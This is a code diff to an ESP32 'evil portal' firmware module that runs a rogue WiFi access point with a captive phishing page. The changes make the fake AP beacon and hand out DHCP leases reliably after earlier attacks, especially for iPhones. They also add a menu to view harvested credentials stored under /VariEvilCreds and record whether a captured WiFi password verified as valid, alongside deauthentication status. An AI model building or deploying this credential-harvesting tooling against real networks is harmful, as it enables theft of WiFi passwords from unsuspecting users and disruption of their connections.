@@ -144,39 +144,41 @@ void EvilPortal::beginAP() {
         drawMainBorderWithTitle("VARIPORTAL");
         displayTextLine("Starting...");
     }
-    // Clean the radio first: a prior WiFi attack leaves promiscuous/sniff state
-    // active, which can leave the portal AP "started" but not beaconing (and
-    // wedges the captive sheet). Mirror _setupAP()'s clean sequence.
+    // Raise the AP using the HW-CONFIRMED _setupAP() formula (wifi_common.cpp).
+    // The whole app (WebUI / "Start WiFi AP" / debrief) raises its AP this way and
+    // it is the only sequence proven joinable on this S3. The evil portal used to
+    // diverge (softAPConfig + custom gateway), which is exactly the path the
+    // working-formula notes flagged as NOT joinable on this board. Converge on the
+    // proven path so the portal AP behaves identically to the others.
+    //   1. NO WiFi.softAPConfig() -> use the DEFAULT IP (192.168.4.1). softAPConfig
+    //      kills the beacon on this S3.
+    //   2. Country MANUAL set AFTER softAP() (the default AUTO regdomain refuses to
+    //      actively beacon until it hears a country; softAPConfig also resets it).
+    //   3. esp_wifi_set_promiscuous(false) AFTER WiFi.mode(AP) (it only takes once
+    //      the driver is started in AP mode).
     WiFi.mode(WIFI_OFF);
     vTaskDelay(100 / portTICK_PERIOD_MS);
-    esp_wifi_set_promiscuous(false);
-    esp_wifi_set_promiscuous_rx_cb(NULL);
 
     if (_verifyPwd) WiFi.mode(WIFI_MODE_APSTA);
     else WiFi.mode(WIFI_MODE_AP);
     vTaskDelay(100 / portTICK_PERIOD_MS);
 
-    wifi_country_t country = {};
-    strncpy(country.cc, "EG", sizeof(country.cc));
-    country.schan = 1;
-    country.nchan = 13;
-    country.policy = WIFI_COUNTRY_POLICY_MANUAL;
-    esp_wifi_set_country(&country);
+    // Scrub leftover sniff/promiscuous state from a prior attack (now that the
+    // driver is up in AP mode) so the AP actually emits a beacon.
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(NULL);
 
-    if (!WiFi.softAPConfig(apGateway, apGateway, IPAddress(255, 255, 255, 0))) {
-        Serial.println("[PORTAL] softAPConfig failed");
-    }
-    if (!WiFi.softAP(apName, emptyString, _channel, 0, 10)) {
+    // DEFAULT IP only (192.168.4.1). NO softAPConfig - it kills the beacon here.
+    if (!WiFi.softAP(apName, emptyString, _channel, 0, 10, false)) {
         Serial.printf("[PORTAL] softAP failed for SSID '%s' on ch%d\n", apName.c_str(), _channel);
     }
-    WiFi.setTxPower(WIFI_POWER_19_5dBm);
-    esp_wifi_set_max_tx_power(80);
-    wifiConnected = true;
+    // Keep the captive-portal gateway/DNS consistent with the real AP IP.
+    apGateway = WiFi.softAPIP();
 
     // DHCP re-seat: after a WiFi attack the AP netif/dhcps can desync so clients
     // associate but never get a lease (the iPhone "joins then drops, no captive
-    // sheet" failure). Force-cycle the AP DHCP server with a valid IP block so a
-    // fresh pool is handed out. Biggest single iOS-join fix.
+    // sheet" failure). Force-cycle the AP DHCP server so a fresh pool is handed
+    // out. Biggest single iOS-join fix.
     esp_netif_t *apNetif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
     if (apNetif) {
         esp_netif_dhcps_stop(apNetif);
@@ -186,6 +188,34 @@ void EvilPortal::beginAP() {
         ipInfo.netmask.addr = (uint32_t)IPAddress(255, 255, 255, 0);
         esp_netif_set_ip_info(apNetif, &ipInfo);
         esp_netif_dhcps_start(apNetif);
+    }
+
+    // Assert MANUAL regdomain + healthy TX power AFTER the AP is running.
+    wifi_country_t country = {};
+    strncpy(country.cc, "EG", sizeof(country.cc));
+    country.schan = 1;
+    country.nchan = 13;
+    country.policy = WIFI_COUNTRY_POLICY_MANUAL;
+    esp_wifi_set_country(&country);
+
+    WiFi.setTxPower(WIFI_POWER_19_5dBm);
+    esp_wifi_set_max_tx_power(80);
+    wifiConnected = true;
+
+    // Diagnostics: read back what the radio is ACTUALLY set to. If the SSID does
+    // not appear, this line tells you why (mode!=2 / low txpow / wrong country).
+    {
+        wifi_mode_t m = WIFI_MODE_NULL;
+        esp_wifi_get_mode(&m);
+        int8_t maxpow = 0;
+        esp_wifi_get_max_tx_power(&maxpow);
+        uint8_t prim = 0;
+        wifi_second_chan_t sec = WIFI_SECOND_CHAN_NONE;
+        esp_wifi_get_channel(&prim, &sec);
+        Serial.printf(
+            "[PORTAL][diag] mode=%d ch=%d maxtxpow=%.1fdBm ssid='%s' ip=%s\n", (int)m, prim,
+            maxpow * 0.25f, apName.c_str(), WiFi.softAPIP().toString().c_str()
+        );
     }
 
     int tmp = millis();
@@ -215,24 +245,18 @@ void EvilPortal::restartWiFi(bool reset) {
     wifiDisconnect();
     WiFi.mode(WIFI_OFF);
     vTaskDelay(100 / portTICK_PERIOD_MS);
-    esp_wifi_set_promiscuous(false);
-    esp_wifi_set_promiscuous_rx_cb(NULL);
 
     if (_verifyPwd) WiFi.mode(WIFI_MODE_APSTA);
     else WiFi.mode(WIFI_MODE_AP);
     vTaskDelay(100 / portTICK_PERIOD_MS);
 
-    wifi_country_t country = {};
-    strncpy(country.cc, "EG", sizeof(country.cc));
-    country.schan = 1;
-    country.nchan = 13;
-    country.policy = WIFI_COUNTRY_POLICY_MANUAL;
-    esp_wifi_set_country(&country);
+    // Scrub promiscuous AFTER the driver is up in AP mode (see beginAP()).
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(NULL);
 
-    WiFi.softAPConfig(apGateway, apGateway, IPAddress(255, 255, 255, 0));
-    WiFi.softAP(apName, emptyString, _channel, 0, 10);
-    WiFi.setTxPower(WIFI_POWER_19_5dBm);
-    esp_wifi_set_max_tx_power(80);
+    // DEFAULT IP only (192.168.4.1). NO softAPConfig - it kills the beacon here.
+    WiFi.softAP(apName, emptyString, _channel, 0, 10, false);
+    apGateway = WiFi.softAPIP();
     vTaskDelay(100 / portTICK_PERIOD_MS);
 
     esp_netif_t *apNetif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
@@ -245,6 +269,18 @@ void EvilPortal::restartWiFi(bool reset) {
         esp_netif_set_ip_info(apNetif, &ipInfo);
         esp_netif_dhcps_start(apNetif);
     }
+
+    // Country MANUAL + TX power AFTER the AP is running.
+    wifi_country_t country = {};
+    strncpy(country.cc, "EG", sizeof(country.cc));
+    country.schan = 1;
+    country.nchan = 13;
+    country.policy = WIFI_COUNTRY_POLICY_MANUAL;
+    esp_wifi_set_country(&country);
+
+    WiFi.setTxPower(WIFI_POWER_19_5dBm);
+    esp_wifi_set_max_tx_power(80);
+    vTaskDelay(100 / portTICK_PERIOD_MS);
 
     setupRoutes();
     dnsServer.start(53, "*", WiFi.softAPIP());
@@ -291,6 +327,22 @@ void EvilPortal::loop() {
                             loopSD(*fs, false, "CSV", "/VariEvilCreds");
                         } else {
                             displayTextLine("No credentials yet");
+                            vTaskDelay(1000);
+                        }
+                    }
+                    shouldRedraw = true;
+                }},
+                {"View last result", [this, &shouldRedraw]() {
+                    // Drill into the live capture file in the vertical pager.
+                    // Verify mode writes to <apName>_creds.csv; harvest mode to outputFile.
+                    FS *fs;
+                    if (getFsStorage(fs)) {
+                        String p = "/VariEvilCreds/" +
+                                   (_verifyPwd ? (apName + "_creds.csv") : outputFile);
+                        if (fs->exists(p)) {
+                            viewFile(*fs, p);
+                        } else {
+                            displayTextLine("No result yet");
                             vTaskDelay(1000);
                         }
                     }
@@ -437,14 +489,60 @@ void EvilPortal::drawScreen() {
 }
 
 void EvilPortal::printLastCapturedCredential() {
-    while (lastCred.length()) {
-        int newlineIndex = lastCred.indexOf('\n');
-        if (newlineIndex > -1) {
-            padprintln(lastCred.substring(0, newlineIndex));
-            lastCred.remove(0, newlineIndex + 1);
-        } else {
-            padprint(lastCred);
-            lastCred = "";
+    // Render from a LOCAL copy so lastCred survives every redraw AND the
+    // "View last result" drill-in (the old code consumed lastCred to empty, so
+    // it showed once then vanished). Bounded so the cred block never overruns
+    // into the fixed-Y "Deauth ON/OFF" footnote drawn last by printDeauthStatus.
+    tft.setTextSize(FP);
+    const int16_t lineH = FP * LH;
+    // Footnote sits at (tftHeight - BORDER_PAD_X - FP*LH); keep one line clear above it.
+    const int16_t boundaryY = tftHeight - BORDER_PAD_X - FP * LH - lineH;
+
+    // Verify headline (verify mode only): one prominent persistent line.
+    if (_verifyPwd && lastVerifyResult != VR_NONE) {
+        bool ok = (lastVerifyResult == VR_VALID);
+        tft.setTextColor(ok ? TFT_GREEN : TFT_RED);
+        padprintln(String("VERIFY: ") + (ok ? "VALID" : "INVALID"));
+        tft.setTextColor(bruceConfig.priColor);
+    }
+
+    // Split the captured-cred text into lines (local copy; lastCred untouched).
+    std::vector<String> lines;
+    String src = lastCred;
+    int start = 0;
+    while (start <= (int)src.length()) {
+        int nl = src.indexOf('\n', start);
+        if (nl < 0) {
+            if (start < (int)src.length()) lines.push_back(src.substring(start));
+            break;
+        }
+        lines.push_back(src.substring(start, nl));
+        start = nl + 1;
+    }
+
+    const int total = (int)lines.size();
+    const int16_t credTopY = tft.getCursorY();
+    int drawn = 0;
+    for (int i = 0; i < total; i++) {
+        int16_t y = tft.getCursorY();
+        if (y + lineH > boundaryY) break;                // no room for another line
+        bool lastSlot = (y + 2 * lineH > boundaryY);     // this is the last line that fits
+        if (lastSlot && i < total - 1) {
+            padprintln("v More (SEL)");                   // overflow marker, drill in with SEL
+            break;                                        // drawn < total -> scrollbar shows
+        }
+        padprintln(lines[i]);
+        drawn++;
+    }
+
+    // Right-edge scrollbar indicator when content overflowed the visible area.
+    if (drawn < total && total > 0) {
+        const int16_t credAreaH = boundaryY - credTopY;
+        if (credAreaH > 4) {
+            tft.drawRect(tftWidth - 6, credTopY, 3, credAreaH, bruceConfig.priColor);
+            int16_t thumbH = (int16_t)((long)credAreaH * drawn / total);
+            if (thumbH < 4) thumbH = 4;
+            tft.fillRect(tftWidth - 6, credTopY, 3, thumbH, bruceConfig.priColor);
         }
     }
 }
@@ -679,6 +777,7 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
         request->send(200, "text/html", wifiLoadPage());
         bool isCorrect = verifyCreds(apName, passwordValue);
         if (isCorrect) {
+            lastVerifyResult = VR_VALID;
             lastCred += "valid: true\nStopping server...";
             saveToCSV(csvLine + ", valid: true", true);
             printDeauthStatus();
@@ -689,6 +788,7 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
             verifyPass = true;
             _deauth = false;
         } else {
+            lastVerifyResult = VR_INVALID;
             lastCred += "valid: false";
             saveToCSV(csvLine + ", valid: false", true);
             portalController(request);
